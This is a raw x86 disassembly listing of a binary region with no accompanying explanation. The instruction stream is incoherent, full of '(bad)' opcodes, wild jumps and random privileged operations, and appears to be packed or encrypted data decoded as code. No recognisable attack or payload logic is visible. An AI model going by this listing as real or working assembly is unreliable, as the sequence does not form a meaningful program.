  406b9e:	call   0x3999ab19
  406ba3:	ja     0x406c1c
  406ba5:	pop    eax
  406ba6:	fisub  WORD PTR [ebp+edx*4-0x4c]
  406baa:	int    0xee
	...
  406bbc:	add    BYTE PTR [eax],al
  406bbe:	test   DWORD PTR [edi+0x3c],ebx
  406bc1:	push   0x357e792
  406bc6:	cli    
  406bc7:	or     ebp,DWORD PTR [ecx+0x526dfeef]
  406bcd:	add    bh,dl
  406bcf:	add    al,0x11
  406bd1:	mov    ah,0x12
  406bd3:	(bad)  
  406bd4:	call   0x8151533d
  406bd9:	jns    0x406c13
  406bdb:	pop    edi
  406bdc:	mov    ss,ebx
  406bde:	xor    BYTE PTR [esp+esi*2],0x7e
  406be2:	dec    esi
  406be3:	push   edi
  406be4:	jle    0x406c4a
  406be6:	stos   BYTE PTR es:[edi],al
  406be7:	mov    dl,0x80
  406be9:	jmp    0x7aaecb29
  406bee:	ja     0x406c44
  406bf0:	pop    esi
  406bf1:	fs and eax,0x1da5396c
  406bf7:	pop    edi
  406bf8:	ret    
  406bf9:	add    esp,DWORD PTR [edx+0xdc31712]
  406bff:	pop    esi
  406c00:	jl     0x406c75
  406c02:	or     eax,0xc7643e5f
  406c07:	pop    ds
  406c08:	add    BYTE PTR [eax],al
  406c0a:	mov    ecx,0x3819e75e
  406c0f:	pop    esi
  406c10:	push   DWORD PTR [eax+0x64]
  406c13:	imul   esi,edi,0xffeb561e
  406c19:	adc    BYTE PTR [ebp+0x56e94118],0x98
  406c20:	lock inc BYTE PTR [eax]
	...
  406c33:	add    BYTE PTR [ecx+0x5e],bl
  406c36:	push   DWORD PTR [esi+edx*1+0x51e9412c]
  406c3d:	xchg   ebx,eax
  406c3e:	shr    esi,0x19
  406c41:	mov    WORD PTR [ebp-0xa1be2b],es
  406c47:	push   ebx
  406c48:	imul   ah
  406c4a:	cmp    bl,BYTE PTR [edi]
  406c4c:	mov    edi,0x2694fe5e
  406c51:	push   esi
  406c52:	inc    esi
  406c54:	sbb    DWORD PTR [eax],ebx
  406c56:	aas    
  406c57:	adc    BYTE PTR [edi-0x40a218a2],dh
  406c5d:	pop    ebp
  406c5e:	jmp    DWORD PTR [eax-0x7d]
  406c61:	ins    DWORD PTR es:[edi],dx
  406c62:	mul    DWORD PTR [esi+0x10ffead9]
  406c68:	dec    ebx
  406c69:	sbb    BYTE PTR [ecx-0x17],al
  406c6c:	fcom   DWORD PTR [edi+0x5dd996f0]
  406c72:	(bad)  
  406c73:	mov    esp,0xe9412c18
  406c78:	rcl    esi,1
  406c7a:	shl    BYTE PTR [esi-0x67],0x8b
  406c7e:	test   DWORD PTR [ecx+0x74ff5dd1],ecx
  406c84:	jae    0x406cc3
  406c86:	neg    DWORD PTR [esi-0x67]
  406c89:	mov    ah,0x67
  406c8b:	mov    esi,0x4dffc3f3
  406c90:	jae    0x406ce7
  406c92:	test   DWORD PTR [eax],0x35fee1bc
	...
  406ca8:	add    BYTE PTR [eax],al
  406caa:	cld    
  406cab:	xor    BYTE PTR [ecx+0x0],al
  406cae:	cmp    edx,DWORD PTR [esi+0xe1cffc0]
  406cb4:	shl    BYTE PTR [edx+edi*8-0x7b],0xbd
  406cb9:	fadd   DWORD PTR [edx+eiz*8]
  406cbc:	inc    BYTE PTR [esi+esi*2]
  406cbf:	push   ecx
  406cc0:	(bad)  
  406cc1:	xor    BYTE PTR [esp+ecx*4],ch
  406cc4:	fdivr  st(7),st
  406cc6:	cld    
  406cc7:	loope  0x406d18
  406cc9:	call   0x401081
  406cce:	clc    
  406ccf:	pop    esp
  406cd0:	or     al,al
  406cd2:	daa    
  406cd3:	or     al,0x50
  406cd5:	call   0x401081
  406cda:	push   esp
  406cdb:	mov    esp,ds
  406cdd:	imul   DWORD PTR [edx+eiz*8+0x1a30014]
  406ce4:	cmp    DWORD PTR [ebp-0x14549],0xffffff93
  406ceb:	xor    eax,0xedee8364
  406cf0:	idiv   bh
  406cf2:	pushf  
  406cf3:	add    DWORD PTR [esp+ebx*2-0x30],esi
  406cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf8:	call   0x22e9f4
  406cfd:	jae    0x406d0f
  406cff:	jno    0x406d00
  406d01:	dec    esp
  406d03:	mov    ds:0xe94b75ff,eax
  406d08:	push   0xffffffba
  406d0a:	mov    esp,0xb5fee2
	...
  406d1f:	add    BYTE PTR [edi-0x46],bh
  406d22:	(bad)  
  406d23:	call   FWORD PTR [esp+edi*1+0x7f5ce807]
  406d2a:	(bad)  
  406d2b:	(bad)  
  406d2c:	mov    esp,0xfaf7e87c
  406d31:	mov    dh,0x61
  406d33:	inc    DWORD PTR [edi+0x40b16b63]
  406d39:	(bad)  
  406d3a:	popa   
  406d3b:	inc    DWORD PTR [edi-0x39]
  406d3e:	pop    ecx
  406d3f:	push   ebp
  406d41:	adc    ebx,eax
  406d43:	pop    es
  406d44:	loop   0x406cd5
  406d46:	popf   
  406d47:	jmp    ebp
  406d49:	and    ebx,DWORD PTR [eax+0x61fbe5e0]
  406d4f:	dec    DWORD PTR [edi+0x66]
  406d52:	imul   edx,DWORD PTR [ebp-0x9df470],0xffffff8f
  406d59:	and    bl,BYTE PTR [edx-0x1]
  406d5c:	mov    ebp,0xa207d75b
  406d61:	dec    ecx
  406d62:	popf   
  406d63:	jmp    FWORD PTR [ebp-0x521b6895]
  406d69:	arpl   WORD PTR [ecx-0x18],sp
  406d6c:	mov    edi,DWORD PTR [ecx+0x61]
  406d6f:	call   DWORD PTR [ebp-0x72088f87]
  406d75:	dec    ebx
  406d76:	ins    BYTE PTR es:[edi],dx
  406d77:	xchg   BYTE PTR [edi+0x43],al
  406d7a:	popa   
  406d7b:	inc    DWORD PTR [edi+0x36]
  406d7e:	pop    ecx
  406d7f:	push   DWORD PTR [ebp+0x46]
  406d82:	fnstsw WORD PTR [eax+eax*1+0x0]
	...
  406d95:	add    BYTE PTR [ebp-0x55],ch
  406d98:	popa   
  406d99:	mov    ch,0x5a
  406d9b:	jnp    0x406dfe
  406d9d:	call   DWORD PTR [edx-0x2]
  406da0:	sahf   
  406da1:	call   DWORD PTR [ebp+0x73]
  406da4:	xchg   edi,eax
  406da5:	lock inc ebp
  406da7:	mov    esp,DWORD PTR [ecx-0x18]
  406daa:	ffreep st(0)
  406dac:	pusha  
  406dad:	(bad)  
  406dae:	cmp    eax,0xede95c21
  406db3:	shl    DWORD PTR [eax-0x1],cl
  406db6:	sub    eax,0x55e85f51
  406dbb:	add    eax,0x4dfa0476
  406dc0:	sub    ecx,DWORD PTR [edx+edi*8]
  406dc3:	mov    cl,0x61
  406dc5:	jo     0x406e40
  406dc7:	inc    ecx
  406dc8:	push   ecx
  406dc9:	out    dx,al
  406dca:	add    eax,0x8760f1ee
  406dcf:	or     al,0x51
  406dd1:	fnstenv [ebx+0x378b365b]
  406dd7:	pop    ecx
  406dd8:	pop    esp
  406dd9:	(bad)  
  406dda:	in     eax,dx
  406ddb:	mov    ah,0x90
  406ddd:	pop    eax
  406dde:	daa    
  406ddf:	(bad)  
  406de0:	call   0xa85246d0
  406de5:	add    ecx,ebp
  406de7:	adc    esi,ecx
  406de9:	sub    bh,BYTE PTR [ebx]
  406deb:	add    eax,0x5bba1d11
  406df0:	dec    BYTE PTR [edx+edi*4]
  406df3:	rcr    ch,1
  406df5:	mov    bl,0x15
  406df7:	push   es
  406df8:	jmp    0x406e6d
	...
  406e09:	add    BYTE PTR [eax],al
  406e0b:	add    BYTE PTR [ebx+ebx*2+0x5c],ah
  406e0f:	pop    esp
  406e10:	dec    edx
  406e11:	pop    esp
  406e12:	push   esp
  406e13:	or     al,0xa2
  406e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e16:	mov    bh,0x60
  406e18:	lea    ebp,[ecx+eiz*8-0x62]
  406e1c:	test   DWORD PTR [ebx+0x74],ebx
  406e1f:	mov    BYTE PTR [ebp+0x2c0a50b4],0xc6
  406e26:	call   0x2851c716
  406e2b:	add    al,0x65
  406e2d:	adc    esi,esp
  406e2f:	sub    bh,BYTE PTR [ebx+0x3a089104]
  406e35:	pop    ebx
  406e36:	xchg   esi,eax
  406e37:	or     al,0x3a
  406e39:	shl    ch,1
  406e3b:	mov    bl,0xdd
  406e3d:	push   es
  406e3e:	jmp    0xf49beab3
  406e43:	pop    ebx
  406e44:	retf   0x5b
  406e47:	cld    
  406e48:	add    DWORD PTR [ebp+0x6e],ebp
  406e4b:	(bad)  
  406e4c:	call   0xff5b:0x7d3de85b
  406e53:	rcl    DWORD PTR [ebx],1
  406e55:	adc    DWORD PTR [ecx-0x17],eax
  406e58:	call   0xff58:0x224107d1
  406e5f:	inc    esi
  406e60:	call   0xe802:0xcc3efbd1
  406e67:	repz (bad) 
  406e69:	pop    edx
  406e6a:	jmp    DWORD PTR [eax]
  406e6c:	aas    
  406e6d:	add    DWORD PTR [eax],eax
  406e6f:	mov    esp,0x0
	...
  406e80:	add    BYTE PTR [eax],al
  406e82:	outs   dx,BYTE PTR ds:[esi]
  406e83:	imul   eax,DWORD PTR [ecx-0xadeadb],0xfbc07c16
  406e8d:	mov    ecx,0x60bd05a
  406e92:	in     al,0x19
  406e94:	sub    DWORD PTR [eax+0x67fd6cf9],ebp
  406e9a:	stc    
  406e9b:	add    al,0xb
  406e9d:	sub    DWORD PTR [edx],ecx
  406e9f:	add    cl,0xe8
  406ea2:	stc    
  406ea3:	add    al,0xc7
  406ea5:	and    al,0x36
  406ea7:	add    eax,0x41f9e900
  406eac:	inc    ebp
  406ead:	aad    0x25
  406eaf:	add    al,BYTE PTR [eax]
  406eb1:	jmp    0xe9a9c949
  406eb6:	arpl   WORD PTR [edx+0x69],bx
  406eb9:	jmp    0x1a342f48
  406ebe:	mov    eax,DWORD PTR [eax+0x59bd9ef4]
  406ec4:	push   eax
  406ec5:	sahf   
  406ec6:	xor    edx,DWORD PTR [edx-0x1]
  406ec9:	sbb    al,0xda
  406ecb:	ins    BYTE PTR es:[edi],dx
  406ecc:	iret   
  406ecd:	pop    edi
  406ece:	inc    BYTE PTR [ebx+ecx*1]
  406ed1:	add    BYTE PTR [ebx-0x6016fbc3],dl
  406ed7:	(bad)  
  406ed8:	(bad)  
  406ed9:	(bad)  
  406eda:	sti    
  406edb:	jo     0x406f05
  406edd:	inc    ecx
  406ede:	adc    edi,DWORD PTR [ebx-0x4934f38c]
  406ee4:	mov    esi,0xff
	...
  406ef5:	add    BYTE PTR [eax],al
  406ef7:	add    BYTE PTR [eax+edx*4-0x74692f76],dh
  406efe:	hlt    
  406eff:	div    DWORD PTR [ecx+edi*4-0x1954adb1]
  406f06:	mov    esi,0x858834ff
  406f0b:	lock sub al,0xba
  406f0e:	(bad)  
  406f0f:	call   0x3fe8ff
  406f14:	mov    DWORD PTR ds:0x40ad7368,eax
  406f1a:	(bad)  
  406f1b:	(bad)  
  406f1c:	cs mov cl,0xf6
  406f1f:	push   esp
  406f21:	mov    ecx,0x40aa3f34
  406f26:	jmp    edi
  406f28:	mov    ebx,0x1affff7a
  406f2d:	mov    esp,fs
  406f2f:	not    DWORD PTR [edx+edi*4+0x454b0069]
  406f36:	xor    eax,0xb4baa341
  406f3b:	lock lods al,BYTE PTR ds:[esi]
  406f3d:	mov    edx,0xf9eefffe
  406f42:	sub    BYTE PTR [ecx-0x6d],al
  406f45:	in     eax,dx
  406f46:	sbb    DWORD PTR [edi-0x7a77454c],edi
  406f4c:	aaa    
  406f4d:	mov    dl,0xfe
  406f4f:	(bad)  
  406f50:	mov    ecx,0x3d656800
  406f55:	inc    eax
  406f56:	(bad)  
  406f57:	(bad)  
  406f58:	scas   al,BYTE PTR es:[edi]
  406f59:	mov    ch,0xf6
  406f5b:	inc    DWORD PTR [eax]
	...
  406f6d:	add    dl,bh
  406f6f:	jb     0x406fcf
  406f71:	xor    eax,0xffc44505
  406f76:	push   ebp
  406f77:	jg     0x406f16
  406f79:	push   DWORD PTR ds:0x25e087d4
  406f7f:	rcr    BYTE PTR [ebp+0x6a],cl
  406f82:	cli    
  406f83:	add    ebp,edx
  406f85:	xor    eax,0xb55e6bbb
  406f8a:	or     dh,BYTE PTR [edx-0x7f200a3]
  406f90:	push   ds
  406f91:	sub    DWORD PTR [ebx+0x3cde6b6b],edi
  406f97:	ret    0x895d
  406f9a:	jg     0x406f52
  406f9c:	push   ebp
  406f9d:	(bad)  
  406f9e:	in     eax,dx
  406f9f:	inc    esp
  406fa0:	add    ebp,DWORD PTR [eax+0x66]
  406fa3:	push   eax
  406fa4:	(bad)  
  406fa5:	(bad)  
  406fa6:	fdivr  QWORD PTR [ecx-0x82a08ae]
  406fac:	pop    ebp
  406fad:	xor    eax,0xffc4450d
  406fb2:	(bad)  [esi]
  406fb4:	popf   
  406fb5:	(bad)  
  406fb6:	mov    ebp,0xaddc87d5
  406fbb:	push   edi
  406fbc:	pop    ebp
  406fbd:	sub    DWORD PTR [edi+0xa],0x56
  406fc1:	jmp    DWORD PTR [ebp+0x7964d76e]
  406fc7:	mov    eax,ds:0x3795f770
  406fcc:	add    al,0x74
  406fce:	cs jmp 0x406f6f
  406fd1:	call   0x406fd6
	...
  406fe2:	add    BYTE PTR [eax],al
  406fe4:	lea    eax,[edi+0x5d]
  406fe7:	add    BYTE PTR [esi],al
  406fe9:	sti    
  406fea:	jmp    0x406feb
  406fec:	jne    0x407035
  406fee:	sahf   
  406fef:	jmp    edi
  406ff1:	imul   eax,DWORD PTR gs:[ebx],0xffffffa2
  406ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ff6:	pop    ebp
  406ff7:	jmp    DWORD PTR [edi+0x55559505]
  406ffd:	pop    eax
  406ffe:	sahf   
  406fff:	xlat   BYTE PTR ds:[ebx]
  407000:	cmc    
  407001:	ins    BYTE PTR es:[edi],dx
  407002:	ds pushf 
  407004:	inc    ebp
  407005:	pop    eax
  407006:	mov    ss,WORD PTR [edi+0x5d865052]
  40700c:	xor    eax,0xc36bf0d2
  407011:	pushf  
  407012:	jbe    0x407071
  407014:	and    eax,0x1d558592
  407019:	pop    eax
  40701a:	data16 xlat BYTE PTR ds:[ebx]
  40701c:	std    
  40701d:	ins    BYTE PTR es:[edi],dx
  40701e:	and    bl,BYTE PTR [ebp+ecx*1+0x1a975658]
  407025:	push   eax
  407026:	dec    esi
  407027:	pop    ebp
  407028:	std    
  407029:	shl    eax,1
  40702b:	imul   esp,DWORD PTR [edi],0xffffff9d
  40702e:	ds pop ebp
  407030:	in     eax,dx
  407031:	xchg   ecx,eax
  407032:	adc    eax,0x2e57e555
  407037:	xlat   BYTE PTR ds:[ebx]
  407038:	cmc    
  407039:	ins    BYTE PTR es:[edi],dx
  40703a:	push   es
  40703b:	pushf  
  40703c:	aad    0x57
  40703e:	push   ds
  40703f:	xchg   edi,eax
  407040:	(bad)  
  407041:	dec    edi
  407042:	push   ss
  407043:	pop    ebp
  407044:	shr    BYTE PTR ds:0x5d52,cl
	...
  40705a:	mov    ebp,0xad703c57
  40705f:	push   edi
  407060:	(bad)  
  407061:	imul   ecx,DWORD PTR [esp+ebx*4],0xfffffff6
  407065:	pop    esp
  407066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407067:	xchg   ecx,eax
  407068:	add    DWORD PTR [ebp-0x63],edx
  40706b:	push   edi
  40706c:	shl    eax,1
  40706e:	push   eax
  40706f:	push   edi
  407070:	ficomp WORD PTR [edi+eax*2+0x64]
  407074:	ficomp WORD PTR [ebp+eax*4+0x6c]
  407078:	loope  0x407012
  40707a:	jge    0x4070d3
  40707c:	(bad)  
  40707d:	xchg   esi,eax
  40707e:	push   esi
  40707f:	dec    edi
  407080:	mov    esi,0x59625c
  407085:	jae    0x40704d
  407087:	push   edi
  407088:	push   DWORD PTR [ecx+ecx*8+0x4f]
  40708c:	jmp    DWORD PTR [esi-0x6ef82e4a]
  407092:	out    0x56,al
  407094:	call   DWORD PTR [esi-0x690f6e5a]
  40709a:	sahf   
  40709b:	push   edi
  40709c:	call   0xff98042e
  4070a1:	jle    0x4070d7
  4070a3:	dec    edi
  4070a4:	jmp    0xff9834d0
  4070a9:	outs   dx,BYTE PTR ds:[esi]
  4070aa:	inc    esp
  4070ab:	pop    ebx
  4070ac:	call   0x44f5c8
  4070b1:	xor    BYTE PTR [ebx+0x72bc000c],bh
  4070b7:	push   0xea9d2583
  4070bc:	call   edx
	...
  4070ce:	add    BYTE PTR [eax],al
  4070d0:	add    eax,0x61f17556
  4070d5:	dec    edi
  4070d6:	mov    bh,0x36
  4070d8:	inc    esi
  4070d9:	mov    WORD PTR [ebp+0x2d],es
  4070dc:	sar    DWORD PTR [esi+0x36],1
  4070df:	test   al,0xf9
  4070e1:	push   ebp
  4070e2:	jne    0x4070d5
  4070e4:	popa   
  4070e5:	dec    edi
  4070e6:	std    
  4070e7:	push   ss
  4070e8:	es push esi
  4070ea:	jne    0x4070f9
  4070ec:	push   ds
  4070ed:	rol    BYTE PTR [edi],1
  4070ef:	adc    eax,ebx
  4070f1:	pushf  
  4070f2:	(bad)  
  4070f3:	inc    BYTE PTR [ebx+0x43]
  4070f6:	add    al,0xe9
  4070f8:	ins    BYTE PTR es:[edi],dx
  4070f9:	mov    ebp,esp
  4070fb:	push   0xe6f73535
  407100:	xor    DWORD PTR [eax+0x5746dd45],ecx
  407106:	jne    0x4070ed
  407108:	and    BYTE PTR [eax],dl
  40710a:	aas    
  40710b:	add    BYTE PTR [edi+0x4700e756],dh
  407111:	lea    eax,[eax]
  407113:	add    BYTE PTR [eax-0x3e],ch
  407116:	push   cs
  407117:	test   DWORD PTR [ecx+0x0],ebp
  40711a:	add    BYTE PTR [eax],al
  40711c:	xchg   esp,eax
  40711d:	inc    esp
  40711e:	test   DWORD PTR [eax],0xc7000263
  407124:	push   ss
  407125:	mov    ch,0xfe
  407127:	pop    es
  407128:	push   ebx
  407129:	add    ch,BYTE PTR [edx+0x0]
  40712c:	stc    
  40712d:	add    BYTE PTR [edx+0x0],ch
  407130:	or     DWORD PTR [ecx],eax
  407132:	lea    eax,[ebp+0x0]
	...
  407145:	add    BYTE PTR [edi-0x587a7370],ah
  40714b:	mov    cl,0xfe
  40714d:	inc    DWORD PTR [ebx]
  40714f:	mov    edx,0x339cf874
  407154:	sti    
  407155:	call   0x40febf
  40715a:	sbb    dl,al
  40715c:	jae    0x407163
  40715e:	mov    edx,0xe30000bb
  407163:	imul   ebp,DWORD PTR [edi-0xfe5dd8],0xd8e9df75
  40716d:	mov    ebp,0xd08aba0c
  407172:	dec    esi
  407173:	test   ah,dh
  407175:	imul   esp
  407177:	mov    ecx,0x5afb524f
  40717c:	mov    ebp,0x8587ecff
  407181:	lock mov ah,0xba
  407184:	(bad)  
  407185:	push   0xffffffa3
  407187:	imul   esp,ebx,0xff015236
  40718d:	mov    ch,0xa3
  40718f:	mov    dl,0xfe
  407191:	call   FWORD PTR [esp+esi*8+0xe2293e]
  407198:	call   0x5ab16bc2
  40719d:	push   DWORD PTR [ebx-0x20]
  4071a0:	pop    esi
  4071a1:	div    DWORD PTR [ebp+0x3e]
  4071a4:	in     eax,dx
  4071a5:	call   ebp
  4071a7:	jo     0x4071ba
  4071a9:	inc    ecx
	...
  4071ba:	add    BYTE PTR [eax],al
  4071bc:	cli    
  4071bd:	mov    ss,WORD PTR [eax+0x5aa665f0]
  4071c3:	dec    DWORD PTR [edi]
  4071c5:	pop    edi
  4071c6:	sub    al,0x41
  4071c8:	cli    
  4071c9:	jae    0x4071cd
  4071cb:	mov    ebp,0x858c6e45
  4071d0:	dec    esi
  4071d1:	outs   dx,BYTE PTR ds:[esi]
  4071d2:	pop    edx
  4071d3:	jmp    DWORD PTR [eax-0x1b261495]
  4071d9:	sub    al,0x4
  4071db:	jmp    FWORD PTR [edi-0x25]
  4071de:	push   ecx
  4071df:	call   FWORD PTR ds:0xe33f0fe6
  4071e5:	lods   al,BYTE PTR ds:[esi]
  4071e6:	add    ebp,eax
  4071e8:	and    esi,DWORD PTR [edi+0x5a]
  4071eb:	push   DWORD PTR [ebx-0x18]
  4071ee:	push   0xfffffff7
  4071f0:	std    
  4071f1:	(bad)
  4071f4:	pop    ebp
  4071f5:	ret    
  4071f6:	adc    BYTE PTR [ecx-0x6],al
  4071f9:	adc    dl,BYTE PTR [eax+0x5a1bedf0]
  4071ff:	jmp    DWORD PTR [edi]
  407201:	arpl   WORD PTR [ecx+eax*2],bp
  407204:	cli    
  407205:	cmc    
  407206:	dec    ebp
  407207:	mov    esp,0x858bf3cd
  40720c:	(bad)  
  40720e:	pop    ecx
  40720f:	jmp    FWORD PTR [edi-0x17]
  407212:	div    DWORD PTR cs:[ebp-0x32984cf5]
  407219:	pushf  
  40721a:	(bad)  
  40721b:	jmp    DWORD PTR [ecx+edx*1+0xf753]
	...
  407232:	popf   
  407233:	arpl   WORD PTR [ecx+0x35],bx
  407236:	aad    0x4
  407238:	adc    bl,al
  40723a:	lea    ebp,[ecx+edx*4-0x68]
  40723e:	test   DWORD PTR [edx+eiz*8+0x43],edx
  407242:	push   es
  407243:	out    dx,al
  407244:	imul   edx,DWORD PTR [edi+0x59c65c4e],0x58d8d9f6
  40724e:	sub    al,BYTE PTR [esp+ebp*2-0x51ab9ac8]
  407255:	mov    ah,0x5d
  407257:	ficomp DWORD PTR [edi+0x59]
  40725a:	dec    ebp
  40725b:	pusha  
  40725c:	cmc    
  40725d:	or     al,0x3a
  40725f:	fldz   
  407261:	mov    bl,0x55
  407263:	fimul  WORD PTR [edi+0x59]
  407266:	xor    eax,0x25386c4c
  40726b:	push   esp
  40726c:	jle    0x40725d
  40726e:	and    eax,0x7786e954
  407273:	xor    eax,0xb5155976
  407278:	shl    BYTE PTR [edi-0x3c],1
  40727b:	vaddps xmm1,xmm2,XMMWORD PTR [edi+0x55]
  407280:	pop    esi
  407281:	pop    ecx
  407282:	std    
  407283:	push   ebx
  407284:	adc    al,0x19
  407286:	and    eax,esi
  407288:	call   0x3ed1c2f8
  40728d:	pop    ecx
  40728e:	jae    0x407219
  407290:	adc    DWORD PTR [ecx-0x23],edx
  407293:	push   ebx
  407294:	push   0xffffff97
	...
  4072a6:	add    BYTE PTR [eax],al
  4072a8:	ficomp WORD PTR [ebx+0x26]
  4072ab:	pop    ecx
  4072ac:	cli    
  4072ad:	add    esp,DWORD PTR [ebp+0x7d]
  4072b0:	cli    
  4072b1:	add    al,0xe9
  4072b3:	test   BYTE PTR [edi+0x60],bh
  4072b6:	push   ss
  4072b7:	pop    ecx
  4072b8:	mov    ch,0x4
  4072ba:	idiv   BYTE PTR [edi+0x7c]
  4072bd:	add    al,0xe9
  4072bf:	add    edi,DWORD PTR [ecx-0x6f]
  4072c2:	add    BYTE PTR [ecx],al
  4072c4:	dec    ebx
  4072c5:	push   esp
  4072c6:	(bad)  
  4072c7:	jmp    0xe9c1fbce
  4072cc:	stc    
  4072cd:	add    al,0x68
  4072cf:	stc    
  4072d0:	stc    
  4072d1:	arpl   WORD PTR [esi-0x17f4532a],di
  4072d7:	js     0x40725d
  4072d9:	push   ebx
  4072da:	inc    esi
  4072dc:	jl     0x40733e
  4072de:	idiv   DWORD PTR [esi-0x1e8aac3e]
  4072e4:	shr    DWORD PTR [ecx-0x4b],1
  4072e7:	scas   al,BYTE PTR es:[edi]
  4072e8:	mov    dl,0x53
  4072ea:	mov    ch,0x91
  4072ec:	stos   BYTE PTR es:[edi],al
  4072ed:	push   ebx
  4072ee:	call   FWORD PTR [esi-0x4117f4cc]
  4072f4:	ins    BYTE PTR es:[edi],dx
  4072f5:	push   ebx
  4072f6:	dec    DWORD PTR [esi-0x7908977c]
  4072fc:	rcl    BYTE PTR [ebx+0x75],cl
  4072ff:	icebp  
  407300:	xchg   ecx,eax
  407301:	cmp    eax,0x53c276b5
  407306:	mov    ch,0x8d
  407308:	stos   BYTE PTR es:[edi],al
  407309:	push   ebx
  40730a:	jmp    DWORD PTR [esi+0x0]
	...
  40731d:	add    BYTE PTR [ebx+ecx*1],bh
  407320:	call   0xff93e7e5
  407325:	push   esi
  407326:	ins    BYTE PTR es:[edi],dx
  407327:	test   DWORD PTR fs:[esi+0x52],0x61f17552
  40732f:	mov    al,ds:0x86423eb5
  407334:	mov    ebp,0xff524a11
  407339:	jmp    0x64c36303
  40733e:	or     DWORD PTR [edx-0x1],ebx
  407341:	push   ds
  407342:	(bad)
  407345:	bound  edi,QWORD PTR [ebp*1+0x52520ef7]
  40734c:	xor    BYTE PTR [eax],al
  40734e:	hlt    
  40734f:	inc    edx
  407350:	pop    es
  407351:	call   0x3ff720
  407356:	clc    
  407357:	jmp    FWORD PTR [ecx+0x0]
  40735a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40735b:	inc    eax
  40735c:	pop    es
  40735d:	call   0x3fe758
  407362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407363:	je     0x407349
  407365:	mul    DWORD PTR [edx+edi*4-0x45747619]
  40736c:	(bad)  
  40736d:	(bad)  
  40736e:	out    dx,al
  40736f:	fdivr  st(6),st
  407371:	jmp    DWORD PTR [ecx+eiz*8-0x455b4783]
  407378:	(bad)  
  407379:	mov    ch,0x3b
  40737b:	ret    0xfffe
  40737e:	imul   esi,DWORD PTR [esi],0xffffffb7
  407381:	inc    DWORD PTR [eax]
	...
  407393:	add    BYTE PTR [edx+edi*4-0x4c],ah
  407397:	loopne 0x4073f5
  407399:	mov    edx,0x70fbe8fe
  40739e:	(bad)  
  40739f:	push   DWORD PTR [esp+esi*2-0x28]
  4073a3:	mul    DWORD PTR [ecx+edi*4-0x4614a219]
  4073aa:	(bad)  
  4073ab:	dec    esi
  4073ad:	mov    eax,0xe094fff6
  4073b2:	push   ecx
  4073b3:	mov    eax,0x45feb9a4
  4073b8:	stos   DWORD PTR es:[edi],eax
  4073b9:	(bad)  
  4073bb:	std    
  4073bc:	inc    esp
  4073bd:	mov    edx,0xe13775fe
  4073c2:	fwait
  4073c3:	mov    dl,bl
  4073c5:	add    eax,0x5dbc2c9
  4073ca:	push   ebp
  4073cb:	mov    edx,DWORD PTR [edi]
  4073cd:	xchg   ah,al
  4073cf:	cld    
  4073d0:	imul   eax,DWORD PTR ds:0x33e40d6a,0x7ffae807
  4073da:	nop
  4073db:	push   DWORD PTR [ebp+0x22fbc0e4]
  4073e1:	adc    cl,BYTE PTR [esi]
  4073e3:	inc    ecx
  4073e4:	cli    
  4073e5:	push   edx
  4073e6:	rol    BYTE PTR [edi],1
  4073e8:	xchg   edx,eax
  4073e9:	fcom   DWORD PTR [edi-0x1]
  4073ec:	xchg   ebp,eax
  4073ed:	(bad)  
  4073ee:	sar    bl,1
  4073f0:	lea    esi,[eax+0x7875e80b]
  4073f6:	push   esi
  4073f7:	inc    DWORD PTR [eax]
	...
  407409:	add    BYTE PTR [ebx-0x31000063],dh
  40740f:	out    0x66,al
  407411:	xor    DWORD PTR [esi],0x65ff4e97
  407417:	loopne 0x4073d8
  407419:	sti    
  40741a:	retf   0xd09a
  40741d:	or     edx,DWORD PTR [ebp+0x58]
  407420:	push   ss
  407421:	sub    DWORD PTR [ebx+0x70526b5b],edi
  407427:	pop    ebx
  407428:	add    ecx,DWORD PTR [ebx]
  40742a:	cmp    ch,BYTE PTR [edx-0x80]
  40742d:	pop    edi
  40742e:	clc    
  40742f:	pop    ebx
  407430:	add    eax,edi
  407432:	mov    bh,0x83
  407434:	add    eax,DWORD PTR [eax]
  407436:	cli    
  407437:	pop    ebx
  407438:	ds inc ebp
  40743a:	es (bad) 
  40743d:	call   DWORD PTR ds:0xfa6a0405
  407443:	xor    eax,0xe0fa6a03
  407448:	mov    edi,0x7fe8aaf3
  40744d:	hlt    
  40744e:	in     eax,dx
  40744f:	mov    edi,0x91ed5055
  407454:	pop    ebx
  407455:	jmp    FWORD PTR [edi+0x12]
  407458:	imul   esp,DWORD PTR [eax+esi*2],0x5e
  40745c:	add    ecx,DWORD PTR [ebx]
  40745e:	mov    edx,0x18e9009a
  407463:	add    eax,0xdcfa03eb
  407468:	pop    eax
  407469:	sub    edi,DWORD PTR [ebx]
  40746b:	add    eax,0xd016
	...
  407480:	add    DWORD PTR [ebp-0x5a],ebx
  407483:	call   0x8a77:0x337250ad
  40748a:	cmc    
  40748b:	dec    ebp
  40748c:	popf   
  40748d:	push   eax
  40748e:	cdq    
  40748f:	mov    cl,0x9d
  407491:	xor    DWORD PTR [edx],0x6c7e8d56
  407497:	push   esp
  407498:	lea    edx,[eax-0x22]
  40749b:	xchg   DWORD PTR [edi+0x41],esi
  40749e:	ficom  WORD PTR [ebp+0x75]
  4074a1:	mov    ch,0x40
  4074a3:	out    0x24,al
  4074a5:	(bad)  
  4074a6:	call   0xb69623ff
  4074ab:	push   ebp
  4074ac:	pop    ebp
  4074ad:	push   eax
  4074ae:	cld    
  4074af:	adc    al,0x23
  4074b1:	(bad)  
  4074b2:	call   0xa6cbf122
  4074b7:	push   ebp
  4074b8:	jae    0x407444
  4074ba:	test   DWORD PTR [ebp+0x3d],ecx
  4074bd:	push   eax
  4074be:	add    eax,DWORD PTR [edx+eiz*4]
  4074c1:	mov    dh,dl
  4074c3:	ret    0x4f2d
  4074c6:	cmp    al,0x54
  4074c8:	sub    eax,0xe7557e50
  4074cd:	xadd   dl,al
  4074d0:	adc    eax,0xd99f968
  4074d5:	push   eax
  4074d6:	jo     0x407557
  4074d8:	push   ss
  4074d9:	pop    eax
  4074da:	pop    esi
  4074db:	push   ebp
  4074dc:	nop
  4074dd:	add    al,0xc1
  4074df:	mov    ch,BYTE PTR ds:0x54e8c6
	...
  4074f5:	add    BYTE PTR [edi-0x1aaac1ac],ah
  4074fb:	dec    edi
  4074fc:	hlt    
  4074fd:	adc    al,0x13
  4074ff:	(bad)  
